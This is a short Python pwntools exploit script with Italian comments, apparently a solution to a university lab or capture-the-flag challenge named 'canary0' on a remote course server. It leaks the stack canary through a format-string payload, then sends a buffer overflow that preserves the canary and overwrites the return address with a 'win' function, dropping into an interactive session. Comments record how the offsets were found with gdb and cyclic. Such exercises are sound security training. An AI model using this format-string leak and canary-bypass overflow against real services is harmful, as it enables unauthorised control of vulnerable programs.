#!/usr/bin/env python3

from pwn import *

# il coso da eseguire
context.binary = ELF(path='./canary0')

p = remote(host='lettieri.iet.unipi.it', port=4410)

p.sendline(b'%p.' * 100)
res = p.recv(2_000_000).replace(b'.', b'\n')

pointers = res.decode().split("\n")
# for i, v in enumerate(pointers):
#     print(i, v)

canary = int(pointers[68],16)
# print(pointers[68])

p.close()

# ho usato cyclic per trovare l'offset di rip (520)
# - add a breakpoint to the JE of the canary
# - set rip=addressoff(LEAVE)
# - ni
# use cyclic.find() to get the offset

p = remote(host='lettieri.iet.unipi.it', port=4410)

# ho `p win`su gdb per trovare l'indirizzo della funzione win
win_p = 0x401282

p.sendline(b"A" * 504 + p64(canary) + b"B" * 8 + p64(win_p))

p.interactive()
